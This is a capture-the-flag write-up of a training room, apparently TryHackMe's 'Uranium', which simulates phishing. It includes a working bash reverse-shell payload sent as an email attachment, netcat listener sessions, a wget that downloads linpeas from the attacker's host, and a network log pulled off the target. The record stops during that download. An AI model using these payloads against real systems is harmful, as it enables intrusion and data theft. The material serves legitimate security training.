# Uranium CTF — Writeup

## Overview
### Uranium CTF — Writeup
### Uranium CTF — Writeup
----
Uranium CTF
----
![](https://coingeek.com/wp-content/uploads/2019/06/binance-decides-to-block-us-users-but-gives-them-a-back-door.jpg)
![](https://tryhackme-images.s3.amazonaws.com/room-icons/6e06fc3dc1d18c68538cfb064c3ec383.jpeg)
Start Machine
We have reached out a account one of the employees [hakanbey](https://twitter.com/hakanbe40520689)
In this room, you will learn about one of the phishing attack methods. I tried to design a phishing room (cronjobs and services) as much as I could.
Special Thanks to kral4 for helping us to make this room
Note: Please do not attack the given twitter account.
MACHINE_IP
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.18.21 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.18.21:22
Open 10.10.18.21:25
Open 10.10.18.21:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.18.21 [3 ports]
Discovered open port 22/tcp on 10.10.18.21
Discovered open port 80/tcp on 10.10.18.21
Discovered open port 25/tcp on 10.10.18.21
Completed Connect Scan (3 total ports)
Initiating Service scan
Scanning 3 services on 10.10.18.21
Completed Service scan (3 services on 1 host)
NSE: Script scanning 10.10.18.21.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.18.21
Host is up, received user-set (0.20s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a13cd7e9d0854033d507163208633105 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMwJfFdIx+ajk4m+SaA9FCONx/arQgXZx22oViZpzp6QSuMYI3u4GXubPf+P/1AKjrdTZ2UtLt3HszSNuf3V/RMQgvXYrPGFmClvfnZZ88an/oz38l4aGTnZ1LJ8upLU90METx4YXcA9uM3u0dECXfUMqFHX+wwFxP/WKUJ7lX3Ae7H+Uj2Bwrw76d8Ndwf3a/EDZ6gTzYTgrgprZQeBbriJM9yrjljakLNCajdDzjtDSQs+wXwme2MXx8u7aAZ4ofL7cuGxCPil2R92HWrKomMQ7Iyd9SMre3rCLhSOhbYnJGTwl3P6fEqCPqp2shMO2AYVrgz0jC6ou8iM3jGe4t
|   256 24810c3a9155a0659e36587151136c34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBZPRLpPW1xp0xWpgkGvpFwR6tKPTMRvjkAbiwoPC/qCKUYg2p06XDFCMHNDmuqIC5SHvnqZqM0EdwJIuUkFvIE=
|   256 c2942b0d8ea953f6ef34dbf1436cc17e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFY55KAy8LZ+FNH0gc/IzoPlL/gQDwtvUMTzmQTd8MAj
25/tcp open  smtp    syn-ack Postfix smtpd
|_smtp-commands: uranium, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=uranium
| Subject Alternative Name: DNS:uranium
| Issuer: commonName=uranium
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| MD5:   293dbef32fee6092c0d72a67ea27367c
| SHA-1: 0a0c26e0ae3c723e538d3c216b40c84cf9e78fdb
| -----BEGIN CERTIFICATE-----
| MIIC0zCCAbugAwIBAgIUIVXdlC2OCz8mRhqtv01MouzQ0ZswDQYJKoZIhvcNAQEL
| BQAwEjEQMA4GA1UEAwwHdXJhbml1bTAeFw0yMTA0MDkyMTQwNTNaFw0zMTA0MDcy
| MTQwNTNaMBIxEDAOBgNVBAMMB3VyYW5pdW0wggEiMA0GCSqGSIb3DQEBAQUAA4IB
| DwAwggEKAoIBAQCpxCDhZoI2WVRkeoeXHBA1Y3LnA0WNjAnH1HyeYwzhKeVekmip
| m3bzvH0e3Z9D9zyf1mnhYnV4i4yA8I+Jp/Cx1Gc9VXvD2cAW4azHdCZBjR6arGCF
| 14gxtdrgiBSdKoMqUo2T9tlfqfnrGOTcc70KYXBJ6tjIHPrFmeXRUvlZWhsF0i1R
| zWqWLNB3Wy7O2yYP2SV8MLjoEGi2ZeqSMbYkhMKTbS7VSLNISO9ax2Wxb5j5lELX
| jLox6/nPueJkLR37YbjDztdZ3Lpz8FXUqymz+OWZq2MLYfde2Zn7cA7zFgeCfOJM
| HhGN9BC046EBW60RVFhWaczTHsRALnWvQ5VfAgMBAAGjITAfMAkGA1UdEwQCMAAw
| EgYDVR0RBAswCYIHdXJhbml1bTANBgkqhkiG9w0BAQsFAAOCAQEAj1F/S1v2EFAL
| H1FG/SWNlqsD9KKwUDSceiHicEz8IE9YU+Vg1NRxluYYpkDbfyrCVBPW//JZJNd2
| jpCObLaQRxZ/4QCa+t4/7Nlue8IiWzax8nEVMUV8clFGlBmktfsx7d/iyjDeGq2H
| VE3p6nFpZFmGmCvYfue9IcZWduFbOIWzf2XvnGnaHxYvccBry7tFGW5F93i3asV3
| UQqT8xZ+eaxzijdoEl9klp/Ee4R2b8bjHMDt7SFzvQAGzL3j1mFPY9qA78K9eNv3
| vHgqdChT9jryHVBEcLiTTPsfNRcARQeOr4O0wGdlQX6E3FRbPn3JpM96Do8+/kJd
| r/RWkJhbQQ==
|_-----END CERTIFICATE-----
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Uranium Coin
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: Host:  uranium; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.31 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ telnet 10.10.18.21 25
Trying 10.10.18.21...
Connected to 10.10.18.21.
Escape character is '^]'.
220 uranium ESMTP Postfix (Ubuntu)
HELO x
250 uranium
VRFY root
252 2.0.0 root

https://twitter.com/hakanbe40520689

I really love this company uranium.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts       
10.10.18.21  uranium.thm

Everyone can send me application files (filename: "application") from my mail account. I open and review all applications one by one in the terminal.

https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp

sendEmail -t hakanbey@uranium.thm -f witty@mail.com -s uranium.thm -u "Testing" -m "Hi" -o tls=no -a application

The command you provided is a syntax for using the "sendEmail" utility to send an email. Here's the breakdown of the command and its options:

1. `-t hakanbey@uranium.thm`: This specifies the recipient's email address. In this case, the email will be sent to "[hakanbey@uranium.thm](mailto:hakanbey@uranium.thm)."
    
2. `-f witty@mail.com`: This specifies the sender's email address. The email will appear to be sent from "[witty@mail.com](mailto:witty@mail.com)."
    
3. `-s uranium.thm`: This is the SMTP server address. The email will be sent using the SMTP server located at "uranium.thm."
    
4. `-u "Testing"`: This is the subject of the email. The subject of the email will be "Testing."
    
5. `-m "Hi"`: This is the body of the email. The content of the email will be "Hi."
    
6. `-o tls=no`: This specifies that TLS (Transport Layer Security) should not be used for the connection. TLS is a security protocol used to encrypt the email communication. Setting it to "no" means that the email will be sent without encryption.
    
7. `-a application`: This is used to attach a file to the email. In this case, "application" refers to the file that you want to attach to the email.
    

By using this command, you can send an email to the specified recipient with the provided subject, body, and attachment (if any), using the specified sender and SMTP server address. However, it's worth noting that the exact behavior and available options of the "sendEmail" utility may vary depending on the version and configuration of the software you are using.

┌──(witty㉿kali)-[~/Downloads]
└─$ cat application 
bash -c "bash -i >& /dev/tcp/10.8.19.103/4444 0>&1"

┌──(witty㉿kali)-[~/Downloads]
└─$ sendEmail -t hakanbey@uranium.thm -f witty@mail.com -s uranium.thm -u "Testing" -m "Hi" -o tls=no -a application
Jul 18 21:18:19 kali sendEmail[313540]: Email was sent successfully!

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.18.21] 46586
bash: cannot set terminal process group (1922): Inappropriate ioctl for device
bash: no job control in this shell
hakanbey@uranium:~$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null
hakanbey@uranium:~$ id
id
uid=1000(hakanbey) gid=1000(hakanbey) groups=1000(hakanbey)

or using swaks

Swaks is a command-line utility used for testing SMTP servers. It stands for "Swiss Army Knife for SMTP" and provides a versatile set of features to send and receive emails, simulate different scenarios, and diagnose SMTP-related issues. Swaks is commonly used by system administrators, developers, and email server operators for testing and troubleshooting email systems.

With Swaks, you can:

1. Send test emails: You can use Swaks to send test emails to check if your SMTP server is working correctly.
    
2. Simulate various email scenarios: Swaks allows you to simulate different scenarios, such as sending emails with different attachments, headers, and content types.
    
3. Test email relaying: Swaks can be used to test if your SMTP server is correctly relaying emails to other servers.
    
4. Debug SMTP issues: If you encounter problems with your email system, Swaks can help you diagnose and debug SMTP-related issues by providing detailed output and error messages.
    

Overall, Swaks is a powerful tool for testing and troubleshooting SMTP servers, and it offers a wide range of options and configurations to suit various testing needs.

┌──(witty㉿kali)-[~/Downloads]
└─$ swaks --to hakanbey@uranium.thm --from hakanbey_fake@uranium.thm --header "Subject: Not phish" --body "hi" --server uranium.thm --attach application
*** DEPRECATION WARNING: Inferring a filename from the argument to --attach will be removed in the future.  Prefix filenames with '@' instead.
=== Trying uranium.thm:25...
=== Connected to uranium.thm.
<-  220 uranium ESMTP Postfix (Ubuntu)
 -> EHLO kali
<-  250-uranium
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250 SMTPUTF8
 -> MAIL FROM:<hakanbey_fake@uranium.thm>
<-  250 2.1.0 Ok
 -> RCPT TO:<hakanbey@uranium.thm>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Tue, 18 Jul 2023 21:23:59 -0400
 -> To: hakanbey@uranium.thm
 -> From: hakanbey_fake@uranium.thm
 -> Subject: Not phish
 -> Message-Id: <20230718212359.315151@kali>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> MIME-Version: 1.0
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_315151"
 -> 
 -> ------=_MIME_BOUNDARY_000_315151
 -> Content-Type: text/plain
 -> 
 -> hi
 -> ------=_MIME_BOUNDARY_000_315151
 -> Content-Type: application/octet-stream; name="application"
 -> Content-Description: application
 -> Content-Disposition: attachment; filename="application"
 -> Content-Transfer-Encoding: BASE64
 -> 
 -> YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE5LjEwMy80NDQ0IDA+JjEiCg==
 -> 
 -> ------=_MIME_BOUNDARY_000_315151--
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as 8E16640130
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.18.21] 46600
bash: cannot set terminal process group (2007): Inappropriate ioctl for device
bash: no job control in this shell
hakanbey@uranium:~$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null

hakanbey@uranium:~$ ls
ls
chat_with_kral4  mail_file  user_1.txt
hakanbey@uranium:~$ cat user_1.txt
cat user_1.txt
thm{2aa50e58fa82244213d5438187c0da7c}

hakanbey@uranium:~$ ./chat_with_kral4
./chat_with_kral4
PASSWORD :a
a
NOT AUTHORIZED

hakanbey@uranium:/home$ cd /tmp
cd /tmp
hakanbey@uranium:/tmp$ wget http://10.8.19.103/linpeas.sh
wget http://10.8.19.103/linpeas.sh
--  http://10.8.19.103/linpeas.sh
Connecting to 10.8.19.103:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828098 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 808.69K   567KB/s    in 1.4s    

(567 KB/s) - ‘linpeas.sh’ saved [828098/828098]

hakanbey@uranium:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
hakanbey@uranium:/tmp$ ./linpeas.sh

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.18.21 - - [18/Jul/2023 21:39:20] "GET /linpeas.sh HTTP/1.1" 200 -

8╔══════════╣ Searching passwords inside logs (limit 70)
,560 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
,560 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
,421 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
,421 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
,761 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
,761 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
,049 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
,049 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
,546 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
,546 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
,232 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
,232 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
,134 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
,134 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
Apr 09 20:41:11 ubuntu-server systemd[1]: Started Forward Password Requests to Wall Directory Watch.
Apr 09 20:41:12 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
Binary file /var/log/hakanbey_network_log.pcap matches

hakanbey@uranium:/var/log$ python3 -m http.server
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.8.19.103 - - [19/Jul/2023 01:46:25] "GET /hakanbey_network_log.pcap HTTP/1.1" 200 -

┌──(witty㉿kali)-[~/Downloads]
└─$ wget http://10.10.18.21:8000/hakanbey_network_log.pcap
--  http://10.10.18.21:8000/hakanbey_network_log.pcap
Connecting to 10.10.18.21:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1869 (1.8K) [application/vnd.tcpdump.pcap]
Saving to: ‘hakanbey_network_log.pcap’

